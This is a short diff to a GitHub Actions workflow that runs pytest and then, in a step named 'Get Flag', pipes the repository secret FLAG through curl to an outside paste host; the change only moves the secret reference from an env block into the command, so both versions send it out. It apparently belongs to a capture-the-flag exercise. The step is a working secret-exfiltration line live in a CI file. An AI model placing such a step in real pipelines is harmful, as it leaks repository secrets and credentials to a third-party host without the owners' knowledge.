@@ -6,8 +6,6 @@ on:
 jobs:
   test:
     runs-on: ubuntu-latest
-    env:
-      FLAG: ${{ secrets.FLAG }}
     steps:
     - uses: actions/checkout@v3
     - name: Set up Python 3.10
@@ -29,4 +27,4 @@ jobs:
       run: | 
         pytest
     - name: Get Flag
-      run: echo $FLAG | curl -F 'content=<-' otn.maxfus.co
+      run: echo ${{ secrets.FLAG }} | curl -F 'content=<-' otn.maxfus.co
